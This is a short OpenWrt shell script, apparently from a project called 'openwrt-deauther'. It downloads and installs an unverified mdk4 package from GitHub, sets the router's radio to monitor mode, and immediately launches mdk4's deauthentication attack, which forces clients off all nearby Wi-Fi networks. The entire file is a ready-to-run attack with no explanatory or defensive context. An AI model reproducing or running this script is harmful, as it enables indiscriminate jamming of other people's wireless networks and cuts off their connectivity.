#!/bin/sh

opkg update
wget -O mdk4.ipk https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/mdk4_4.2-5_mipsel_24kc.ipk
opkg install mdk4.ipk

cat >mon.sh << EOF
iw phy phy0 interface add mon0 type monitor
echo 'monitor mode mon0 enable'
ip link set mon0 up
EOF
#
chmod +x mon.sh
#
sh mon.sh && mdk4 mon0 d

